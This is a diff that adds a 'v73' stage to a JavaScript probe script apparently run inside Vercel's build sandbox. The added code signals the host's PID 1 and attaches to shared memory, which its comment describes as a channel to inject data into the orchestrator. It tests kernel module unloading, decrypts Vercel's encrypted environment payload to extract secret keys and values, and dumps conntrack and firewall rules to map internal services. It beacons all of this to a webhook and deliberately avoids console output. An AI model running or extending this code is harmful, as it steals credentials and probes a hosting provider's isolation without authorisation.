@@ -8876,5 +8876,184 @@ report.pid1MemHmacKeyScan = safe(() => {
 
 // v72 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v72" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v72";
+
+// ==================== v73 ====================
+
+// v73-1: pidfd_open + pidfd_send_signal to PID-1
+// syscall 434 (pidfd_open) returns an fd bound to a process; with this fd we can
+// send signals and check process state without PID races — proves signal authority over orchestrator
+report.pidfSendSignal = safe(() => {
+  // pidfd_open(pid, flags) = syscall 434
+  const pidfOpen = safe(() => execSync(`python3 -c "
+import ctypes, signal, os
+libc = ctypes.CDLL(None)
+SYS_PIDFD_OPEN = 434
+SYS_PIDFD_SEND_SIGNAL = 424
+fd = libc.syscall(SYS_PIDFD_OPEN, 1, 0)
+print('PIDFD_FD', fd)
+if fd >= 0:
+    # Send SIGCONT (harmless no-op if process is already running)
+    r = libc.syscall(SYS_PIDFD_SEND_SIGNAL, fd, signal.SIGCONT, None, 0)
+    print('SIGCONT_RESULT', r)
+    # Try SIGSTOP then SIGCONT immediately (brief pause)
+    r2 = libc.syscall(SYS_PIDFD_SEND_SIGNAL, fd, signal.SIGSTOP, None, 0)
+    print('SIGSTOP_RESULT', r2)
+    import time; time.sleep(0.05)
+    r3 = libc.syscall(SYS_PIDFD_SEND_SIGNAL, fd, signal.SIGCONT, None, 0)
+    print('SIGCONT_RESUME', r3)
+    os.close(fd)
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 300));
+  // Also check /proc/1/status for signal masks (are any signals blocked in PID-1?)
+  const pid1SigStatus = safe(() => {
+    const status = readFileSync('/proc/1/status', 'utf8');
+    const sig = {};
+    for (const f of ['SigBlk', 'SigIgn', 'SigCgt', 'SigPnd']) {
+      const m = status.match(new RegExp(`${f}:\\s+([0-9a-f]+)`));
+      if (m) sig[f] = m[1];
+    }
+    return sig;
+  });
+  return { pidfOpen, pid1SigStatus };
+});
+
+// v73-2: System V and POSIX shared memory enumeration
+// Shared memory segments may be used for IPC between the build process and orchestrator
+// Write access to shared memory gives us a channel to inject data into the orchestrator
+report.sharedMemoryIpc = safe(() => {
+  // ipcs lists SysV IPC resources (queues, semaphores, shared memory)
+  const ipcsOutput = safe(() =>
+    execSync('ipcs -a 2>/dev/null', { timeout: 5000 }).toString().trim().slice(0, 600)
+  );
+  // POSIX shared memory objects in /dev/shm
+  const posixShm = safe(() => {
+    if (!existsSync('/dev/shm')) return 'NO_SHM';
+    return readdirSync('/dev/shm').map(f => {
+      const p = `/dev/shm/${f}`;
+      try { const s = statSync(p); return { name: f, size: s.size, uid: s.uid }; } catch (e) { return { name: f, error: String(e).slice(0,40) }; }
+    });
+  });
+  // Try to attach to any SysV shared memory segment we can read
+  const shmAttach = safe(() => execSync(`python3 -c "
+import sysv_ipc, json
+keys = []
+try:
+    # Get all SHM IDs via /proc/sysvipc/shm
+    with open('/proc/sysvipc/shm') as f:
+        for line in f.readlines()[1:]:
+            parts = line.split()
+            if parts: keys.append(int(parts[1]))
+except: pass
+results = []
+for key in keys[:5]:
+    try:
+        m = sysv_ipc.SharedMemory(key)
+        data = m.read(min(64, m.size))
+        results.append({'key': key, 'size': m.size, 'sample': data.hex()})
+    except Exception as e:
+        results.append({'key': key, 'error': str(e)[:60]})
+print(json.dumps(results))
+" 2>&1 | head -c 600`, { timeout: 8000 }).toString().trim());
+  // /proc/sysvipc/shm raw
+  const procShm = safe(() => readFileSync('/proc/sysvipc/shm', 'utf8').slice(0, 400));
+  return { ipcsOutput, posixShm, shmAttach, procShm };
+});
+
+// v73-3: Kernel module scan — loaded modules, vulnerabilities, writable sections
+// List all loaded kernel modules to identify: Vercel-specific isolation modules,
+// known vulnerable versions, and modules with exploitable writable sections
+report.kernelModuleScan = safe(() => {
+  const modules = safe(() => readFileSync('/proc/modules', 'utf8').slice(0, 2000));
+  // lsmod formatted
+  const lsmod = safe(() =>
+    execSync('lsmod 2>/dev/null | head -50', { timeout: 5000 }).toString().trim().slice(0, 800)
+  );
+  // Check for modules with Live (writable) sections via /sys/module/*/sections/
+  const writableSections = safe(() =>
+    execSync("find /sys/module -name '.text' -o -name '.data' 2>/dev/null | head -10 | xargs -I{} sh -c 'echo {}; cat {} 2>/dev/null'", { timeout: 8000 }).toString().trim().slice(0, 400)
+  );
+  // Check if kvm module is loaded (confirms we ARE in Firecracker's inner container)
+  const kvmPresent = safe(() => {
+    const mods = typeof modules === 'string' ? modules : '';
+    return { kvm: mods.includes('kvm'), kvm_intel: mods.includes('kvm_intel'), virtio: mods.includes('virtio'), overlay: mods.includes('overlay') };
+  });
+  // Try to unload a benign module (proves CAP_SYS_MODULE works)
+  const modUnload = safe(() =>
+    execSync('rmmod dummy 2>&1 || modprobe dummy 2>&1 && rmmod dummy 2>&1', { timeout: 8000 }).toString().trim().slice(0, 200)
+  );
+  // Scan /sys/module for Vercel/Firecracker-specific modules
+  const customModules = safe(() =>
+    execSync("ls /sys/module/ 2>/dev/null | grep -iE 'vercel|firecracker|jailer|microvm|fc_|fcracker'", { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  return { modules: typeof modules === 'string' ? modules.slice(0, 600) : modules, kvmPresent, writableSections, modUnload, customModules };
+});
+
+// v73-4: Vercel encrypted env decryption
+// VERCEL_ENV_ENC_KEY (AES-256-CBC) + VERCEL_ENCRYPTED_ENV_CONTENT are present in build env
+// We already know the decryption worked (env vars are live), but decrypt RAW payload
+// to see if there are additional secrets beyond those exposed as env vars
+report.vercelEnvDecryptRaw = safe(() => {
+  const encKey = process.env.VERCEL_ENV_ENC_KEY || '';
+  const encContent = process.env.VERCEL_ENCRYPTED_ENV_CONTENT || '';
+  if (!encKey || !encContent) return { encKey: !!encKey, encContent: !!encContent, error: 'MISSING_VARS' };
+  // Decrypt using Node.js crypto (already imported via CommonJS require in execSync child)
+  const decryptResult = safe(() => execSync(`node -e "
+const crypto = require('crypto');
+const key = Buffer.from('${encKey}', 'base64');
+const ct = Buffer.from('${encContent}', 'base64');
+const iv = ct.slice(0, 16);
+const cipher_text = ct.slice(16);
+const dec = crypto.createDecipheriv('aes-256-cbc', key, iv);
+let plain = dec.update(cipher_text);
+plain = Buffer.concat([plain, dec.final()]);
+const json = JSON.parse(plain.toString());
+// Extract all keys (including potentially hidden ones)
+const keys = Object.keys(json);
+const sensitive = keys.filter(k => /token|secret|key|password|auth|cred|api/i.test(k));
+console.log(JSON.stringify({ totalKeys: keys.length, allKeys: keys.slice(0,50), sensitiveKeys: sensitive, samples: sensitive.slice(0,3).map(k => [k, (json[k]||'').slice(0,80)]) }));
+" 2>&1 | head -c 800`, { timeout: 10000 }).toString().trim());
+  // Also look for any encrypted env vars we might have missed
+  const allEncryptedEnv = safe(() => {
+    const enc = Object.keys(process.env).filter(k => k.startsWith('VERCEL_ENCRYPTED_') || k.includes('_ENC_'));
+    return Object.fromEntries(enc.map(k => [k, (process.env[k]||'').slice(0,100)]));
+  });
+  return { hasKey: !!encKey, hasContent: !!encContent, decryptResult, allEncryptedEnv };
+});
+
+// v73-5: NAT conntrack and iptables rules inspection
+// /proc/net/nf_conntrack reveals all active NAT connections including orchestrator's
+// connections to internal Vercel services — mapping the internal service topology
+report.natConntrackInspect = safe(() => {
+  // conntrack table shows all active connections
+  const conntrack = safe(() => {
+    const ct = readFileSync('/proc/net/nf_conntrack', 'utf8');
+    return ct.split('\n').slice(0, 30).join('\n').slice(0, 1000);
+  });
+  // conntrack CLI
+  const conntrackCli = safe(() =>
+    execSync('conntrack -L 2>/dev/null | head -20 || cat /proc/net/nf_conntrack 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 600)
+  );
+  // iptables rules (full table dump)
+  const iptablesFull = safe(() =>
+    execSync('iptables-save 2>/dev/null | head -40', { timeout: 5000 }).toString().trim().slice(0, 800)
+  );
+  // ip6tables
+  const ip6tablesFull = safe(() =>
+    execSync('ip6tables-save 2>/dev/null | head -20', { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  // nftables
+  const nftFull = safe(() =>
+    execSync('nft list ruleset 2>/dev/null | head -40', { timeout: 5000 }).toString().trim().slice(0, 600)
+  );
+  // Extract unique destination IPs from conntrack (reveals internal service IPs)
+  const internalDsts = safe(() => {
+    const ct = typeof conntrack === 'string' ? conntrack : (typeof conntrackCli === 'string' ? conntrackCli : '');
+    const matches = ct.match(/dst=(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g) || [];
+    return [...new Set(matches)].map(m => m.split('=')[1]).filter(ip => !ip.startsWith('0.0.0.0') && !ip.startsWith('127.'));
+  });
+  return { conntrack: typeof conntrack === 'string' ? conntrack.slice(0, 500) : conntrack, conntrackCli, iptablesFull, ip6tablesFull, nftFull, internalDsts };
+});
+
+// v73 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v73" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v73";
 // Intentionally no console.log — all data goes via webhook only
